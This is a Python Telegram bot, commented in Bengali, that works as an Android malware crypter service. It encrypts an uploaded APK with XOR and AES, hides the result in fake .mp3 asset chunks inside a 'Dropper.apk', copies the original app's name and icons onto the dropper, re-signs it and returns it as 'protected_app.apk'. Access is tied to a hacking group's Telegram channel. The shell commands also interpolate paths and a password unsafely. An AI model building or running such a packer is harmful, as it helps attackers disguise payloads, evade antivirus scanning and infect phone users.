import os
import json
import base64
import hashlib
import sqlite3
import datetime
import tempfile
import shutil
import subprocess
import threading
import random
import string
import time
import logging
import re
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ----- লগিং -----
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ----- Flask -----
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK"

# ----- কনফিগারেশন -----
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN environment variable not set!")
else:
    logger.info(f"✅ BOT_TOKEN loaded (first 5 chars: {BOT_TOKEN[:5]}...)")

# ----- গ্রুপ ও লিমিট -----
REQUIRED_GROUP = "@hackdin_red"
GROUP_INVITE_LINK = "https://t.me/hackdin_red"
DAILY_LIMIT = 1

# ----- ক্রিপ্টো (আপনার দেওয়া কী) -----
OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="

def xor_data(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def decode_obfuscated(b64_str: str) -> bytes:
    raw = base64.b64decode(b64_str)
    mask = hashlib.sha256("dynamic_key_rotate_monthly".encode()).digest()
    return xor_data(raw, mask)

ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
NUM_PARTS = 15
PREFIX = "part_"   # আপনার অ্যাপের getSecret(3) অনুযায়ী (যদি খালি হয়, তাহলে "" দিন)
TARGET_PACKAGE = "com.meteah.apl"

# ----- ডাটাবেস (কী + ডেইলি লিমিট) -----
DB_PATH = 'db/keys.db'
os.makedirs('db', exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        user_id INTEGER PRIMARY KEY,
        key TEXT,
        expiry_date TEXT,
        last_use_date TEXT,
        use_count INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()
    logger.info("Database initialized.")

def generate_key(user_id):
    raw = os.urandom(16)
    key = hashlib.sha256(raw).hexdigest()[:16]
    expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
    today = datetime.datetime.now().date().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO keys (user_id, key, expiry_date, last_use_date, use_count) VALUES (?, ?, ?, ?, ?)',
              (user_id, key, expiry, today, 0))
    conn.commit()
    conn.close()
    return key

def validate_key(user_id, key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT expiry_date FROM keys WHERE user_id=? AND key=?', (user_id, key))
    row = c.fetchone()
    conn.close()
    if not row:
        return False
    expiry = datetime.datetime.fromisoformat(row[0])
    return expiry > datetime.datetime.now()

def get_user_key(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT key, expiry_date FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    return row if row else None

def check_daily_limit(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT last_use_date, use_count FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    today = datetime.datetime.now().date().isoformat()
    if not row:
        return True  # নতুন ইউজার
    last_date, count = row
    if last_date == today:
        return count < DAILY_LIMIT
    else:
        # নতুন দিন – কাউন্ট রিসেট
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('UPDATE keys SET last_use_date=?, use_count=0 WHERE user_id=?', (today, user_id))
        conn.commit()
        conn.close()
        return True

def increment_use(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('UPDATE keys SET use_count = use_count + 1 WHERE user_id=?', (user_id,))
    conn.commit()
    conn.close()

# ----- এনক্রিপশন (XOR → AES) – আপনার app.py-এর মতো -----
def process_encryption(apk_data: bytes, assets_dir: str):
    # 1. XOR
    xor_step = xor_data(apk_data, ACTUAL_XOR_KEY)
    # 2. AES (CBC, PKCS5)
    iv_bytes = bytes.fromhex(IV_HEX)
    cipher = AES.new(ACTUAL_AES_KEY, AES.MODE_CBC, iv_bytes)
    encrypted_full = cipher.encrypt(pad(xor_step, AES.block_size))
    # 3. চাঙ্ক
    chunk_size = len(encrypted_full) // NUM_PARTS + 1
    chunks = []
    for i in range(NUM_PARTS):
        start = i * chunk_size
        end = min(start + chunk_size, len(encrypted_full))
        chunks.append(encrypted_full[start:end])
    # 4. মেটাডেটা (manifest.json)
    meta = {
        "build_id": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "timestamp": int(time.time()),
        "total_parts": NUM_PARTS,
        "chunk_size": chunk_size,
        "enc_size": len(encrypted_full),
        "original_size": len(apk_data),
        "original_md5": hashlib.md5(apk_data).hexdigest(),
        "aes_key": OBFUSCATED_AES_KEY_B64,
        "aes_iv": IV_HEX,
        "xor_key": OBFUSCATED_XOR_KEY_B64,
        "entropy_seed": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
        "v3_flag": True
    }
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'manifest.json'), 'w') as f:
        json.dump(meta, f, indent=4)
    # 5. চাঙ্ক ফাইল
    for i, chunk in enumerate(chunks):
        with open(os.path.join(assets_dir, f"{PREFIX}{i}.mp3"), 'wb') as f:
            f.write(bytes(chunk))
    return meta

# ----- APK প্রসেসিং (মূল কাজ) -----
async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    await context.bot.send_message(chat_id, "📥 APK received. Processing started.")

    work_dir = tempfile.mkdtemp()
    try:
        input_apk = os.path.join(work_dir, 'input.apk')
        with open(input_apk, 'wb') as f:
            f.write(apk_data)

        # 1. ইউজারের APK ডিকম্পাইল (শুধু নাম ও আইকন বের করতে)
        decoded_user = os.path.join(work_dir, 'decoded_user')
        cmd = f"apktool d -f -o {decoded_user} {input_apk}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{result.stderr[:500]}")
            return

        # 2. নাম ও আইকন এক্সট্র্যাক্ট
        app_name = "App"
        strings_path = os.path.join(decoded_user, 'res/values/strings.xml')
        if os.path.exists(strings_path):
            try:
                import xml.etree.ElementTree as ET
                tree = ET.parse(strings_path)
                root = tree.getroot()
                for string in root.findall('string'):
                    if string.get('name') == 'app_name':
                        app_name = string.text
                        break
            except:
                pass

        # 3. Dropper.apk ডিকম্পাইল
        dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
        if not os.path.exists(dropper_apk):
            await context.bot.send_message(chat_id, "❌ Dropper.apk not found! Please place it in the bot directory.")
            return
        decoded_dropper = os.path.join(work_dir, 'decoded_dropper')
        cmd = f"apktool d -f -o {decoded_dropper} {dropper_apk}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{result.stderr[:500]}")
            return

        # 4. অ্যাসেট রিপ্লেস (manifest.json + .mp3)
        assets_dir = os.path.join(decoded_dropper, 'assets')
        process_encryption(apk_data, assets_dir)

        # 5. নাম ও আইকন কপি (শুধু .png ফাইল)
        res_user = os.path.join(decoded_user, 'res')
        res_dropper = os.path.join(decoded_dropper, 'res')
        if os.path.exists(res_user):
            for root, dirs, files in os.walk(res_user):
                for d in dirs:
                    if d.startswith('drawable') or d.startswith('mipmap'):
                        src = os.path.join(root, d)
                        dst = os.path.join(res_dropper, d)
                        os.makedirs(dst, exist_ok=True)
                        for f in os.listdir(src):
                            if f.endswith('.png'):
                                shutil.copy2(os.path.join(src, f), dst)
        # strings.xml আপডেট
        strings_dst = os.path.join(decoded_dropper, 'res/values/strings.xml')
        if os.path.exists(strings_dst):
            try:
                import xml.etree.ElementTree as ET
                tree = ET.parse(strings_dst)
                root = tree.getroot()
                for string in root.findall('string'):
                    if string.get('name') == 'app_name':
                        string.text = app_name
                        break
                tree.write(strings_dst)
            except:
                pass

        # 6. Manifest আপডেট (label ও icon সেট)
        manifest_path = os.path.join(decoded_dropper, 'AndroidManifest.xml')
        if os.path.exists(manifest_path):
            with open(manifest_path, 'r') as f:
                content = f.read()
            # label ও icon যোগ/আপডেট
            if 'android:label="' in content:
                content = re.sub(r'android:label=".*?"', 'android:label="@string/app_name"', content)
            else:
                content = content.replace('<application ', '<application android:label="@string/app_name" ')
            if 'android:icon="' in content:
                content = re.sub(r'android:icon=".*?"', 'android:icon="@drawable/img"', content)
            else:
                content = content.replace('<application ', '<application android:icon="@drawable/img" ')
            with open(manifest_path, 'w') as f:
                f.write(content)

        # 7. রিকম্পাইল
        output_apk = os.path.join(work_dir, 'output.apk')
        cmd = f"apktool b -o {output_apk} {decoded_dropper}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr[:500]}")
            return

        # 8. সাইন
        keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
        if not os.path.exists(keystore):
            await context.bot.send_message(chat_id, "❌ Keystore not found! Please upload signer/myKey.p12")
            return
        pass_file = os.path.join(os.getcwd(), 'signer', 'keystore_pass.txt')
        if os.path.exists(pass_file):
            with open(pass_file, 'r') as f:
                passwd = f.read().strip()
        else:
            passwd = os.environ.get('KEYSTORE_PASS', '123456')
        cmd = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storetype PKCS12 -storepass {passwd} -keypass {passwd} {output_apk} mykey"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr[:500]}")
            return

        # 9. অ্যালাইন (ঐচ্ছিক)
        aligned_apk = os.path.join(work_dir, 'aligned.apk')
        try:
            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True)
            final_apk = aligned_apk
        except:
            final_apk = output_apk

        # 10. ইউজারকে পাঠান
        with open(final_apk, 'rb') as f:
            await context.bot.send_document(chat_id, f, filename="protected_app.apk")
        await context.bot.send_message(chat_id, "✅ Done! Your protected APK is ready.")

        # 11. ব্যবহার কাউন্ট বাড়ান
        increment_use(user_id)

        shutil.rmtree(work_dir)
        logger.info(f"APK processing complete for user {user_id}")

    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.send_message(chat_id, f"❌ Error: {str(e)[:500]}")
        shutil.rmtree(work_dir, ignore_errors=True)

# ----- বট কমান্ড -----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔑 Get License Key", callback_data='get_key')],
        [InlineKeyboardButton("📤 Upload APK", callback_data='upload')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 APK Converter Bot\n\n"
        "Get a 30-day license key first.\n"
        f"⚠️ You must join {GROUP_INVITE_LINK} first.\n"
        f"Daily limit: {DAILY_LIMIT} APK per day.",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == 'get_key':
        key = generate_key(user_id)
        await query.edit_message_text(
            f"✅ Your 30-day key:\n\n`{key}`\n\n"
            f"Send /activate {key}"
        )
    elif query.data == 'upload':
        # ১. গ্রুপ চেক
        try:
            chat_id = "@" + REQUIRED_GROUP.lstrip("@")
            member = await context.bot.get_chat_member(chat_id, user_id)
            if member.status not in ["member", "administrator", "creator"]:
                await query.edit_message_text(f"❌ You must join {GROUP_INVITE_LINK} first.")
                return
        except Exception:
            await query.edit_message_text("❌ Could not verify group membership. Please join the group.")
            return
        # ২. লাইসেন্স চেক
        key_data = get_user_key(user_id)
        if not key_data or not validate_key(user_id, key_data[0]):
            await query.edit_message_text("❌ No valid license. Get a key first.")
            return
        # ৩. ডেইলি লিমিট চেক
        if not check_daily_limit(user_id):
            await query.edit_message_text(f"❌ Daily limit ({DAILY_LIMIT}) reached. Use a new key tomorrow.")
            return
        await query.edit_message_text("📤 Send your APK file.")

async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /activate <key>")
        return
    user_id = update.effective_user.id
    if validate_key(user_id, args[0]):
        await update.message.reply_text("✅ Key activated!")
    else:
        await update.message.reply_text("❌ Invalid or expired key.")

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # ১. গ্রুপ চেক
    try:
        chat_id = "@" + REQUIRED_GROUP.lstrip("@")
        member = await context.bot.get_chat_member(chat_id, user_id)
        if member.status not in ["member", "administrator", "creator"]:
            await update.message.reply_text(f"❌ You must join {GROUP_INVITE_LINK} first.")
            return
    except Exception:
        await update.message.reply_text("❌ Could not verify group membership. Please join the group.")
        return

    # ২. লাইসেন্স চেক
    key_data = get_user_key(user_id)
    if not key_data or not validate_key(user_id, key_data[0]):
        await update.message.reply_text("❌ No valid license. Get a key first.")
        return

    # ৩. ডেইলি লিমিট চেক
    if not check_daily_limit(user_id):
        await update.message.reply_text(f"❌ Daily limit ({DAILY_LIMIT}) reached. Use a new key tomorrow.")
        return

    if not update.message.document:
        await update.message.reply_text("❌ Please send an APK file.")
        return
    if not update.message.document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ File must be .apk")
        return

    await update.message.reply_text("📦 APK received! Starting processing...")

    try:
        file = await update.message.document.get_file()
        apk_data = await file.download_as_bytearray()
        context.application.create_task(process_apk_file(update, context, apk_data))
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Commands:\n"
        "/start - Main menu\n"
        "/activate <key> - Activate license\n"
        "/help - This help"
    )

# ----- Flask-কে থ্রেডে চালানোর ফাংশন -----
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ----- বট রান (মেইন থ্রেডে) -----
def run_bot():
    try:
        init_db()
        if not BOT_TOKEN:
            logger.error("BOT_TOKEN missing! Bot will not start.")
            return

        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("activate", activate))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))

        logger.info("✅ Bot starting polling...")
        application.run_polling(drop_pending_updates=True)

    except Exception as e:
        logger.error(f"Bot crashed: {e}")

# ----- মেইন -----
if __name__ == "__main__":
    # Flask আলাদা থ্রেডে চালু করুন
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    # বট মেইন থ্রেডে চালু করুন
    run_bot()
